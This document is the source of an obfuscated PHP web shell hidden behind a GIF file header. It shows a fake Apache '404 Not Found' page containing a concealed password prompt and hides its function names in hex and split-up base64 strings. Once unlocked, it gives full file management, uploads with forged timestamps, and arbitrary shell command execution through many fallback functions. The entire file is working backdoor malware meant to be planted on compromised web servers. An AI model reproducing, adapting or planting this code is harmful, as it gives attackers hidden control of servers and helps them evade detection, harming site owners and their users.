GIF89a;<?php session_start();$login="1";if($login=="1"){function generateRandomStringx($length=10){return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',ceil($length/strlen($x)))),1,$length);}function License(){echo "<!DOCTYPE html><html><head><meta name='robots' content='NOINDEX, NOFOLLOW, NOARCHIVE, NOSNIPPET'><title></title></head><body><h1>Not Found</h1><title>404 Not Found</title><style type='text/css'>input[type=password] { width: 250px; height: 25px; color: white; background: transparent; border: 1px solid white; margin-left: 20px; text-align: center; }</style><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr><address>Apache Server</address><center><form method='post'><input type='password' name='".$_SESSION["pupu"]."' autocomplete='off'><br></form></center></body></html>";exit();}$noauth="0821c7593aed5dc00c83ae89502908a57fc52f4b";if(empty($_SESSION["pupu"])){$pupux=generateRandomStringx();$_SESSION["pupu"]=$pupux;}$pupu=$_SESSION["pupu"];if(empty($_SESSION[sha1(md5($_SERVER["HTTP_HOST"])).$pupu])){if(isset($_POST[$pupu])and sha1(md5($_POST[$pupu]))==$noauth){$_SESSION[sha1(md5($_SERVER["HTTP_HOST"])).$pupu]=true;}else{License();exit();}}}function rehex($y){$n='';for($i=0;$i<strlen($y)-1;$i+=2){$n.=chr(hexdec($y[$i].$y[$i+1]));}return $n;}$murray=array('7068705f756e616d65','70687076657273696f6e','6368646972','676574637764','707265675f73706c6974','636f7079','66696c655f6765745f636f6e74656e7473','6261736536345f6465636f6465','69735f646972','6f625f656e645f636c65616e28293b','756e6c696e6b','6d6b646972','63686d6f64','7363616e646972','7374725f7265706c616365','68746d6c7370656369616c6368617273','7661725f64756d70','666f70656e','667772697465','66636c6f7365','64617465','66696c656d74696d65','737562737472','737072696e7466','66696c657065726d73','746f756368','66696c655f657869737473','72656e616d65','69735f6172726179','69735f6f626a656374','737472706f73','69735f7772697461626c65','69735f7265616461626c65','737472746f74696d65','66696c6573697a65','726d646972','6f625f6765745f636c65616e','7265616466696c65','617373657274','677A696E666C617465');$___=count($murray);for($i=0;$i<$___;$i++){$MRT[]=rehex($murray[$i]);}function rmdir_recursive($dir){global $MRT;foreach($MRT[13]($dir)as $file){if('.'===$file||'..'===$file)continue;if($MRT[8]("$dir/$file")){@$MRT[12]("$dir/$file",0777);rmdir_recursive("$dir/$file");}else{@$MRT[12]("$dir/$file",0777);$MRT[10]("$dir/$file");}}@$MRT[12]($dir,0777);$MRT[35]($dir);}function stopmd5(){unset($_SESSION["satingga"]);}function startmd5(){$_SESSION["satingga"]="margin";}function rec($j){global $MRT;if(trim(pathinfo($j,PATHINFO_BASENAME),'.')===''){return;}if($MRT[8]($j)){array_map('rec',glob($j.DIRECTORY_SEPARATOR.'{,.}*',GLOB_BRACE|GLOB_NOSORT));rmdir_recursive($j);}else{@$MRT[10]($j);}}function rpl($j,$k){global $MRT;$obok=rehex($j);$ebek=rehex($k);if(is_file($ebek)&&is_file($obok)&&$MRT[31]($obok)){@$MRT[5]($ebek,$obok);echo "<h2 class='text-center mt-3'>BERHASIL <br>replace ".$ebek." </br>ke</br> ".$obok."</h2>";}else{echo "<h2 class='text-center mt-3'>GAGAL <br>replace </br> ".$obok."</h2>";}}function dre($y1,$y2){global $MRT;ob_start();$MRT[16]($y1($y2));return $MRT[36]();}function hex($n){$y='';for($i=0;$i<strlen($n);$i++){$y.=dechex(ord($n[$i]));}return $y;}function OK(){global $MRT,$d;@$MRT[38]('$MRT[9]');redirectkeDepan(hex($d).'&1');exit();}function ER(){global $MRT,$d;@$MRT[38]('$MRT[9]');redirectkeDepan(hex($d).'&0');exit();}function x($c){global $MRT;$perms=@$MRT[24]($c);switch($perms&0xF000){case '0xC000':$info='s';break;case '0xA000':$info='l';break;case '0x8000':$info='r';break;case '0x6000':$info='b';break;case '0x4000':$info='d';break;case '0x2000':$info='c';break;case '0x1000':$info='p';break;default:$info='u';}$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));return $MRT[23]('<!-- %s --> [%s]',$info,$MRT[22](decoct($perms),2));}function GetFileTime($x,$y){global $MRT;switch($y){case "create":return $MRT[20]("Y-m-d H:i:s",@filectime($x));break;case "modify":return $MRT[20]("Y-m-d H:i:s",@$MRT[21]($x));break;case "access":return $MRT[20]("Y-m-d H:i:s",@fileatime($x));break;}}function GetFileSize($x){global $MRT;$x=abs($x);$size=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');$exp=$x?floor(log($x)/log(1024)):0;return $MRT[23]('%.2f '.$size[$exp],($x/pow(1024,floor($exp))));}function GetFileOwnerGroup($x){global $MRT;if(Unix()){if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$user=posix_getpwuid(@fileowner($x));$group=posix_getgrgid(@filegroup($x));return $MRT[23]('%s:%s',$user['name'],$group['name']);}}elseif(class_exists('COM')){$su=new COM("ADsSecurityUtility");$securityInfo=$su->GetSecurityDescriptor($x,1,1);return $MRT[23]('%s:%s',$securityInfo->owner,$securityInfo->owner);}else{return "Windows Owner";}clearstatcache();}function Unix(){global $MRT;return(strtolower($MRT[22](PHP_OS,0,3))!="win");}function b64ed($xf){$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;return $b64($xf);}function b64dd($xf){$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";$_g="_";$_h="d";$_i="e";$_j="c";$_k="o";$_l="d";$_m="e";$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;return $b64($xf);}function exe($cmd){$result="";if(!empty($cmd)){if(is_callable("exec")){exec($cmd,$result);$result=join("\n",$result);}elseif(class_exists('COM')){$dWs=new COM('WScript.shell');$exec=$dWs->exec('cmd.exe /c '.$cmd);$stdout=$exec->StdOut();$result=$stdout->ReadAll();}elseif(is_callable("shell_exec")){$result=shell_exec($cmd);}elseif(is_callable("system")){@ob_start();system($cmd);$result=@ob_get_contents();@ob_end_clean();}elseif(is_callable("passthru")){@ob_start();passthru($cmd);$result=@ob_get_contents();@ob_end_clean();}elseif(($result=`$cmd`)!==false){}elseif(is_resource($fp=popen($cmd,"r"))){$result="";while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}elseif(class_exists('ReflectionFunction')){@ob_start();$function=new ReflectionFunction('system');$function->invoke($cmd);$result=@ob_get_contents();@ob_end_clean();}elseif(function_exists('call_user_func_array')){@ob_start();$call_user_func_array('system',array($cmd));$result=@ob_get_contents();@ob_end_clean();}elseif(function_exists('call_user_func')){@ob_start();call_user_func('system',$cmd);$result=@ob_get_contents();@ob_end_clean();}}return $result;}function strposa($haystack,$needles,$offset=0){global $MRT;foreach($needles as $needle){if($MRT[30]($haystack,$needle,$offset)!==false){return true;}}return false;}function decno($string){global $MRT;$key="\x4d\101\130\x49\x4d\x5f\x4d\70";$resultdoh='';$string=b64dd($string);for($i=0;$i<strlen($string);$i++){$char=$MRT[22]($string,$i,1);$keychar=$MRT[22]($key,$i%strlen($key)-3,1);$char=chr(ord($char)-ord($keychar));$resultdoh.=$char;}return $resultdoh;}function redirectkeDepan($url){if(!headers_sent()){header('Location: ?d='.$url);exit;}else{echo '<body onload="history.go(-1);">';exit;}}function reader($reader){global $MRT;if(function_exists('file_get_contents')){$readerx=$MRT[6]($reader);return $readerx;}else{ob_start();printf($reader);$readerx=ob_get_contents();ob_end_clean();return $readerx;}}if(!function_exists('posix_getegid')){$user=@get_current_user();$uid=@getmyuid();$gid=@getmygid();$group="?";}else{$uid=@posix_getpwuid(@posix_geteuid());$gid=@posix_getgrgid(@posix_getegid());$user=$uid['name'];$uid=$uid['uid'];$group=$gid['name'];$gid=$gid['gid'];}function dapatCWD(){global $MRT;if(function_exists("\x67\x65\164\143\167\144")){return@$MRT[3]();}else{return dirname($_SERVER["SCRIPT_FILENAME"]);}}function path(){global $MRT;if(isset($_GET['dir'])){$dir=$MRT[14]("\\","/",$_GET['dir']);@$MRT[2]($dir);}else{$dir=$MRT[14]("\\","/",dapatCWD());}return $dir;}$dir=path();function myscandir($dir){global $MRT;if(function_exists("scandir")){if(is_dir($dir)&&is_readable($dir))return $MRT[13]($dir);}else{if(is_dir($dir)&&is_readable($dir)){$dh=opendir($dir);while(false!==($filename=readdir($dh)))$files[]=$filename;return $files;}}}if(!function_exists("scandir")){function scandir($dir){if(is_dir($dir)&&is_readable($dir)){$dh=opendir($dir);while(false!==($filename=readdir($dh)))$files[]=$filename;return $files;}}}function fullx($filePath){global $MRT;if(isset($filePath)&&$MRT[30]($filePath,$_SERVER['DOCUMENT_ROOT'])!==false){$fullx=$_SERVER['HTTP_HOST'].$MRT[14]($_SERVER['DOCUMENT_ROOT'],"",$filePath);$fullx=$MRT[14]("//","/",$fullx);$fullx=$MRT[14]("\\\\","/",$fullx);$fullxy='- Link: <a href="//'.$fullx.'" target="_blank">'.$fullx.'</a>';}else{$fullx=$_SERVER['HTTP_HOST'];$fullxy='- Link: <a href="//'.$fullx.'/" target="_blank">'.$fullx.'</a>';}return $fullxy;}function fullURL($filePath){global $MRT;if(isset($filePath)&&$MRT[30]($filePath,$_SERVER['DOCUMENT_ROOT'])!==false){$fullx=$_SERVER['HTTP_HOST'].$MRT[14]($_SERVER['DOCUMENT_ROOT'],"",$filePath);$fullURL=$MRT[14]('//',"/",$fullx);}else{$fullURL=$_SERVER['HTTP_HOST'];}return $fullURL;}function header_Everyfile($endfiles){$blahcode='<div class="inline">
             <input onclick="location.href=\'?d='.$_GET["d"].'&e='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" />
             <input onclick="location.href=\'?d='.$_GET["d"].'&r='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" />
             <input onclick="location.href=\'?d='.$_GET["d"].'&x='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
             <input onclick="location.href=\'?d='.$_GET["d"].'&t='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" />
             <input onclick="location.href=\'?d='.$_GET["d"].'&k='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" />
             <input onclick="location.href=\'?d='.$_GET["d"].'&s='.$endfiles.'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" />
             </div>';return $blahcode;}function OS(){global $MRT;return($MRT[22](strtoupper(PHP_OS),0,3)==="WIN")?"Windows":"Linux";}function windisk(){global $MRT;$letters="";$v=explode("\\",path());$v=$v[0];foreach(range("A","Z")as $letter){$bool=$isdiskette=in_array($letter,array("A"));if(!$bool)$bool=$MRT[8]("$letter:\\");if($bool){$letters.="[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";if($letter.":"!=$v){$letters.=$letter;}else{$letters.=color(1,2,$letter);}$letters.="</a> ]";}}if(!empty($letters)){print"Detected Drives $letters<br>";}}error_reporting(0);echo '<!DOCTYPE html><html dir="auto" lang="en-US"><head><meta charset="UTF-8"><meta name="robots" content="NOINDEX, NOFOLLOW, NOARCHIVE, NOSNIPPET"><title>X</title>
        <link rel="shortcut icon" href="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDe0T9mrwn46/YZ/YvsfDv7Fv8AY/jDxZpVtaL4z/4Q/wAAal/wld5L8PtbaK78i51RTeYuhFqflakIFk+xfOVn8uNuf8eeA/hT8Fv2VP2rfA/jj9lLw/J8VpNK1O00PXLvQPh1o1/YXlj8OtDnvbu1sodWaWLy5mk1aSLSUuFgW+DKTMZI15/4Q/ts3+kfA/8AZ109f2jfsMPwu0rQ7vwlb/8ACz/hxD9ovG+G2ume08qXSmm0b7Nf+Ro/m6u1wrfb9xBmCSLz/wC0B+0BovxF8FfGjWNY+NHh/wAQ+IPEOleJbu/v7vx98Mr2/wDDl5P8MtBjNpalNIF1qX267E2iSS6JJaqV08Ejzd7sAf/Z"><link rel="stylesheet" href="'.decno("x8GsvbSSeHzDvKa8btLDe8a2rLW2une2znylrqrGd7DSwA==").'">
        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"><script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script><link rel="stylesheet" href="'.decno("x8GsvbSSeHzDvKa8btLDe8a2rLW2une2znyauaK7tHvCwKs=").'"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/monokai.css">
            <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/dracula.min.css"><script src="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/matchbrackets.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/selection/active-line.min.js"></script></head><body><div class="corona"><div id="jump_to_me"></div><nav class="navbar navbar-expand-md navbar-dark bg-dark" style="height: 60px;margin-top: 10px;">';if(isset($_GET["d"])){$d=rehex($_GET["d"]);$MRT[2](rehex($_GET["d"]));}else{$d=$MRT[3]();}$k=$MRT[4]("/(\\\|\/)/",$d);$dnya="$d/";$dbener=$MRT[14]('//',"/",$dnya);echo '<div class="collapse navbar-collapse" id="navbarNav"><ul class="navbar-nav"> <li class="nav-item active"><a class="nav-link ajx" href="?"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDe0T9mrwn46/YZ/YvsfDv7Fv8AY/jDxZpVtaL4z/4Q/wAAal/wld5L8PtbaK78i51RTeYuhFqflakIFk+xfOVn8uNuf8eeA/hT8Fv2VP2rfA/jj9lLw/J8VpNK1O00PXLvQPh1o1/YXlj8OtDnvbu1sodWaWLy5mk1aSLSUuFgW+DKTMZI15/4Q/ts3+kfA/8AZ109f2jfsMPwu0rQ7vwlb/8ACz/hxD9ovG+G2ume08qXSmm0b7Nf+Ro/m6u1wrfb9xBmCSLz/wC0B+0BovxF8FfGjWNY+NHh/wAQ+IPEOleJbu/v7vx98Mr2/wDDl5P8MtBjNpalNIF1qX267E2iSS6JJaqV08Ejzd7sAf/Z" title="ethical" alt="ethical"></a> </li>';echo '<li class="nav-link active">';foreach($k as $m=>$l){if($l==''&&$m==0){echo '<a class="ajx" href="?d=2f">/</a>';}if($l==''){continue;}echo '<a class="ajx" href="?d=';for($i=0;$i<=$m;$i++){echo hex($k[$i]);if($i!=$m){echo '2f';}}echo '">'.$l.'</a>/';}print" &raquo; <code>$dbener</code>";echo ' [<a href="//'.fullURL($d).'" target="_blank">&#x2346;</a>]';print "</li></ul>";echo '</div>';echo '<div class="y x"><a href="?" class="ajx"><h2 class="ml2 letter">X</h2></a></div>';if(isset($_SESSION["satingga"])){echo '<sup>Full</sup>';}else{echo '<sup>Lite</sup>';}echo '&nbsp; &nbsp; <form method="post" enctype="multipart/form-data"><label class="l w"><br><input type="file" name="n[]" onchange="this.form.submit()" multiple class="form-control mr-3"></label>&nbsp;</form><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button></nav><div class="u">';echo '<style>.notifyjs-container { color: #000; }</style>';$o_=array('<script>$.notify("','", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>');$f=$o_[0].'✅  Success!'.$o_[1];$g=$o_[0].'❌ Failed!'.$o_[1];if(isset($_FILES["n"])){$z=$_FILES["n"]["name"];$r=count($z);for($i=0;$i<$r;$i++){if($MRT[5]($_FILES["n"]["tmp_name"][$i],$z[$i])){echo $f;@$MRT[25]($z[$i],$MRT[33]("-".rand(30,150)." days",time()));}else{echo $g;}}}echo '</div><div class="corona mh-100">';if(isset($_POST['do_dir'])){$guantidirnya=$MRT[14]('//',"/",$_POST['chxdir']);if($MRT[22]($guantidirnya,-1)=='/'){$guantidirnya=$MRT[22]($guantidirnya,0,-1);}if(!$MRT[8]($guantidirnya)){echo '<body onload="history.go(-1);">';exit;}else{echo '<meta http-equiv="refresh" content="0;url=?d='.hex($guantidirnya).'">';exit;}}print(OS()==="Windows")?windisk():"";echo '<div class="semprotna"><div style="min-height:50px;';if(isset($_SESSION["satingga"])){echo "float: left;";}echo 'padding-top: 20px;"><a class="btn btn-success btn-sm ajx" href="?d='.hex($d).'&n">+NEWFILE+</a> <a class="btn btn-success btn-sm ajx " href="?d='.hex($d).'&l">+NEWDIR+</a>';if(isset($_SESSION["satingga"])){echo ' <a class="btn btn-secondary btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xoff').'">LITE</a>';}else{echo ' <a class="btn btn-danger btn-sm ajx " href="?d='.hex($d).'&'.hex('md5xon').'">FULL</a>';}echo '</div> ';if(isset($_SESSION["satingga"])){if(isset($_POST['do_cmd'])){$jadul=b64dd($_POST['cmd']);echo "<div class='form-outline'><textarea id='phpss' class = 'form-control'>".$MRT[15](exe($jadul))."</textarea></div>";echo ' <script>var editor=CodeMirror.fromTextArea(document.getElementById("phpss"),{theme:"dracula",styleActiveLine: true,readOnly: "true",matchBrackets:!0,lineNumbers:!0,indentUnit:4,indentWithTabs:!0,lineWrapping:!0,autofocus:!0}).setSize(1150,400);</script>';}if(isset($_POST['cmd'])){$docmd=b64dd($_POST['cmd']);}else{$docmd="";}echo "<div class='text-center' style='margin-top: 20px;'><form method='post' onsubmit='return btoaMRX()'>\n                    <input readonly style='width: 85px;border: none;border-bottom: 1px solid #00ff00;' type='text' size='13' onclick='this.select();' value='".$user."'>@<input readonly style='color:transparent;text-shadow: 0px 0px 4px #fff;width: 85px;border: none;border-bottom: 1px solid #00ff00;' type='text' size='13' onclick='this.select();' value='".gethostbyname($_SERVER['HTTP_HOST'])."'> &nbsp; \n\t\t\t\t<input style='border: none; border-bottom: 1px solid #00ff00;' type='text' id='inputTextY' size='75%' height='10' name='cmd' value='".$docmd."'><input class='btn btn-warning btn-sm' type='submit' name='do_cmd' value='ENTER'></form>";}else{echo "";}if(isset($_POST['deleteFilez'])){if(!empty($_POST['cucok'])){$checked_count=count($_POST['cucok']);echo "DELETED ".$checked_count." option(s): ";foreach($_POST['cucok']as $selected){$carinamafileaja=pathinfo($selected);$fname=$carinamafileaja['filename'];$ename=$carinamafileaja['extension'];if($MRT[26]($selected)&&is_file($selected)&&$MRT[10]($selected)){echo ' &#128304; '.$fname.'.'.$ename." ";}else{if($MRT[26]($selected)&&$MRT[8]($selected)&&$MRT[35]($selected)){echo ' &#128162; '.$fname." ";}if($MRT[26]($selected)){rec($selected);echo ' &#128304; &#128162; '.$fname." ";}}}echo ' (This page will reload in 3 seconds)<meta http-equiv="refresh" content="3">';}}$a_='<style>.divide{width:100%;border:0;display:inline-block}.divide-left{float:left;width:49.5%}.divide-right{float:right;width:49.5%}</style><table cellspacing="0" cellpadding="7" width="100%"><thead><tr><th>';$b_='</th></tr></thead><tbody><tr><td></td></tr><tr><td>';$c_='</td></tr></tbody></table>';$d_='<input type="submit" class="btn btn-success form-control col-md-3" value="&nbsp;OK&nbsp;" /></form>';function rayeli($checkfx,$namafile){global $MRT;if(isset($_SESSION["satingga"])){printf("<div class='divide table table-bordered mt-2 hoverTable'><div class='divide-left'><table class='table table-bordered hoverTable'> <tr><td>Size</td><td>%s</td></tr><tr><td>Permission</td><td>%s</td></tr><tr><td>Created time</td><td>%s</td></tr><tr><td>Last modified</td><td>%s</td></tr><tr><td>Last accessed</td><td>%s</td></tr></table></div><div class='divide-right'><table class='table table-bordered  hoverTable'> <tr><td>File</td><td>".$namafile."</td></tr><tr><td>Owner/Group</td><td>%s</td></tr><tr><td>MD5</td><td>%s</td></tr><tr><td>SHA1</td><td>%s</td></tr><tr><td>Path</td><td>%s</td></tr></table></div></div>",GetFileSize(@$MRT[34]($checkfx)),x($checkfx),GetFileTime($checkfx,"create"),GetFileTime($checkfx,"modify"),GetFileTime($checkfx,"access"),GetFileOwnerGroup($checkfx),@md5_file($checkfx),@sha1_file($checkfx),realpath($checkfx));}}if(isset($_GET["s"])){$checkfx=$d.'/'.rehex($_GET["s"]);if($MRT[26]($checkfx)){echo $a_.'<div style="float:left;color: green;"><h2>Viewing '.rehex($_GET["s"]).'</h2></div><div style="float:right">Path: <code>'.$d.'/'.rehex($_GET["s"]).'</code> '.fullx($checkfx).'</div>'.$b_.header_Everyfile($_GET["s"]).'
 <textarea id="inputTextF" class="form-control">'.$MRT[15](reader(rehex($_GET["s"]))).'</textarea><div style="float:right;"><br /><button class="btn btn-secondary btn-sm" onclick="saveTextAsFile()">DOWNLOAD</button><br /><script>var editor=CodeMirror.fromTextArea(document.getElementById("inputTextF"),{theme:"dracula",mode: "application/x-httpd-php", styleActiveLine: true,readOnly: "true",matchBrackets:!0,lineNumbers:!0,indentUnit:4,indentWithTabs:!0,lineWrapping:!0,autofocus:!0}).setSize(1136,400);function saveTextAsFile(){var e=document.getElementById("inputTextF").value,t=new Blob([e],{type:"text/plain"}),n=document.createElement("a");n.download="'.rehex($_GET["s"]).'",n.innerHTML="DOWNLOAD",null!=window.webkitURL?n.href=window.webkitURL.createObjectURL(t):(n.href=window.URL.createObjectURL(t),n.onclick=destroyClickedElement,n.style.display="none",document.body.appendChild(n)),n.click()}</script>'.$c_;rayeli($checkfx,rehex($_GET["s"]));}else{echo "<h2>FILE NOT EXIST!</h2>";}}elseif(isset($_GET["y"])){echo $a_.'REQUEST'.$b_.'
 <form method="post">
    <input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
    <input class="form-control md-3" type="text" name="2" autocomplete="off" />
    '.$d_.'
 <br /><textarea readonly class = "form-control">';if(isset($_POST["2"])){echo $MRT[15](dre($_POST["1"],$_POST["2"]));}echo '</textarea>
        '.$c_;}elseif(isset($_GET["e"])){$checkfx=$d.'/'.rehex($_GET["e"]);if($MRT[26]($checkfx)){if($MRT[31]($checkfx)){$satinggaWR='<h2 style="color: #fff;">Editing '.rehex($_GET["e"]).'</h2>';echo $a_.' <div style="float:left">'.$satinggaWR.'</div><div style="float:right">Path: <code>'.$checkfx.'</code> '.fullx($checkfx).'</div>'.$b_.header_Everyfile($_GET["e"]).'
                                <script>function btoaMRD() { var input = document.getElementById("inputTextFQ").value; var encoded = btoa(input);document.getElementById("inputTextFQ").value = encoded; } </script>
 <form method="post" onsubmit="return btoaMRD()">
  <textarea name="e" id="inputTextFQ" class="form-control">'.$MRT[15](reader(rehex($_GET["e"]))).'</textarea>
  <div style="float:left;width:450px;margin-right:40px;"><br><input name="r" autocomplete="off" class="form-control" type="text" value="'.$checkfx.'"></div>
 <br><div style="float:right;">
 <button class="btn btn-secondary btn-sm" onclick="saveTextAsFile()">DOWNLOAD</button></div>    '.$d_.'
        '.$c_.'<script>var editor=CodeMirror.fromTextArea(document.getElementById("inputTextFQ"),{theme:"monokai",mode: "application/x-httpd-php",styleActiveLine: true,matchBrackets:!0,lineNumbers:!0,indentUnit:4,indentWithTabs:!0,lineWrapping:!0,autofocus:!0}).setSize(1136,400);
            function saveTextAsFile(){var e=document.getElementById("inputTextFQ").value,t=new Blob([e],{type:"text/plain"}),n=document.createElement("a");n.download="'.rehex($_GET["e"]).'",n.innerHTML="Download File",null!=window.webkitURL?n.href=window.webkitURL.createObjectURL(t):(n.href=window.URL.createObjectURL(t),n.onclick=destroyClickedElement,n.style.display="none",document.body.appendChild(n)),n.click()}</script>';rayeli($checkfx,rehex($_GET["e"]));if(isset($_POST["e"])){if(isset($_POST["r"])){$nfiletujuan=$_POST["r"];$nfilerefresh=hex(basename($_POST["r"]));}else{$nfiletujuan=rehex($_GET["e"]);$nfilerefresh=$_GET["e"];}$ex=b64ed($_POST['e']);$fp=$MRT[17]($nfiletujuan,'w');if($MRT[18]($fp,b64dd($ex))){$MRT[19]($fp);$wfolder=$MRT[20]("Y-m-d g:i",$MRT[21]("/"));$px=$MRT[33]($wfolder);@$MRT[25]($checkfx,$px);echo '<meta http-equiv="refresh" content="0;url=\'?d='.$_GET["d"].'&e='.$nfilerefresh.'\'" />';}else{ER();}}}else{echo "<br>".header_Everyfile($_GET["e"])."<h1 class='text-center'>File not writeable!</h1><p class='text-center'>He has returned to his glory, your printer is part of a flaming botnet, the hacker god has returned from the dead. YOUR PRINTER HAS BEEN OWNED!</p>";}}else{echo "<hr><br><center><h2>File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a></h2></center>";}}elseif(isset($_GET["x"])){rec(rehex($_GET["x"]));if($MRT[26](rehex($_GET["x"]))){ER();}else{OK();}}elseif(isset($_GET["t"])){$checkfx=$d.'/'.rehex($_GET["t"]);if($MRT[26]($checkfx)){echo $a_.'<div style="float:left"><h2>Ganti Waktu File '.rehex($_GET["t"]).'</h2></div><div style="float:right">Path: <code>'.$checkfx.'</code> '.fullx($checkfx).'</div>'.$b_.header_Everyfile($_GET["t"]).'
 <center><form action="" method="post"><input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="'.$MRT[20]("Y-m-d H:i",$MRT[21](rehex($_GET["t"]))).'">
                    '.$d_.'
